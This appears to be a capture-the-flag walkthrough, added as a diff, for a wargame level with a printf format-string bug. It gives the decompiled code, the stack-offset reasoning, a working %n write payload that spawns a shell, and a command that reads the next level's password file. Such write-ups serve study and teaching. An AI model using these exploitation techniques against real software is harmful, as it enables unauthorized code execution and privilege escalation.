@@ -1,0 +1,161 @@
+# Level 4 Walkthrough
+
+## Goal
+
+Same class of vulnerability as level 3 — format string. But this time
+the global variable must equal `0x1025544` (16930116), a much larger
+value. The target address is also at a different stack position.
+
+---
+
+## 1. Analyze the Binary
+
+```bash
+gdb ./level4
+(gdb) info functions
+(gdb) disas main
+(gdb) disas p
+```
+
+Decompiled logic:
+
+```c
+int m = 0;  // global at 0x8049810
+
+void p(char *buf) {
+    printf(buf);        // ← vulnerable
+}
+
+void n() {
+    char buf[520];
+    fgets(buf, 520, stdin);
+    p(buf);
+    if (m == 0x1025544) {
+        system("/bin/sh");
+    }
+}
+```
+
+Same bug — `printf(buf)` with no format specifier. But two things
+changed: the required value and the stack position.
+
+---
+
+## 2. What Changed vs Level 3
+
+| | Level 3 | Level 4 |
+|---|---|---|
+| Target address | `0x0804988c` | `0x08049810` |
+| Required value | `0x40` = 64 | `0x1025544` = 16930116 |
+| Stack position | 4 | 12 |
+| Padding needed | 60 bytes | 16930112 bytes |
+
+---
+
+## 3. Why Position 12
+
+In level 3, `printf` was called directly inside the same function that
+called `fgets`. The buffer was close to the top of the stack — position 4.
+
+Here, `buf` is passed as an argument into `p()`. This adds an extra
+stack frame between `printf` and where `buf` actually lives in memory.
+The extra frame pushes our input further down the stack to **position 12**.
+
+Verify by sending `AAAA%12$x` — if it prints `41414141` your address
+is at position 12.
+
+---
+
+## 4. The Big Number Problem
+
+In level 3 we needed to write 64. Easy — just pad to 64 bytes total.
+
+Here we need **16930116**. We can't realistically print 16 million
+visible characters and count them. But we don't have to — `%Nx` where
+N is huge will print N characters of output, incrementing printf's
+internal byte counter to whatever we need.
+
+```
+4 bytes (address) + 16930112 (%16930112x) = 16930116 = 0x1025544 ✓
+```
+
+The padding value is just arithmetic:
+```
+target - bytes already printed = padding needed
+16930116 - 4 = 16930112
+```
+
+---
+
+## 5. Payload Breakdown
+
+```
+[0x08049810][%16930112x][%12$n]
+```
+
+| Part | Bytes printed |
+|---|---|
+| `\x10\x98\x04\x08` | 4 |
+| `%16930112x` | 16930112 |
+| **Total** | **16930116 = 0x1025544** |
+| `%12$n` | writes 16930116 into address at position 12 |
+
+---
+
+## 6. Exploit
+
+```bash
+(python2 -c 'import struct; print struct.pack("<I", 0x08049810) + "%16930112x" + "%12$n"'; cat) | ./level4
+```
+
+⚠️ This will print ~16 million spaces to the terminal. That's expected
+— it's how `%n` counting works. Wait for it.
+
+---
+
+## 7. Execution Flow
+
+```
+fgets reads input into buf
+     │
+p(buf) called → extra stack frame pushed
+     │
+printf(buf) executes our format string
+     │
+Prints 4 raw address bytes          → 4 bytes so far
+     │
+%16930112x prints padded hex value  → 16930116 bytes so far
+     │
+%12$n fires:
+  walks stack to position 12
+  finds 0x08049810 (our embedded address)
+  writes 16930116 into that address
+     │
+m = 0x1025544
+     │
+back in n(): if (m == 0x1025544) passes
+     │
+system("/bin/sh")
+     │
+Shell as level5
+```
+
+---
+
+## 8. Get the Password
+
+```bash
+cat /home/user/level5/.pass
+```
+
+---
+
+## Key Concepts
+
+| Concept | Meaning |
+|---|---|
+| **`%12$n`** | Write to position 12 — further than level 3 due to extra stack frame |
+| **`%16930112x`** | Pads output to 16930112 chars — controls the value `%n` writes |
+| **Byte counting** | `printf` counts every byte it prints; `%n` captures that count |
+| **Large write** | Same `%n` trick, just a bigger target value = bigger padding |
+| **Extra stack frame** | `p(buf)` call shifts buffer's stack position from 4 to 12 |
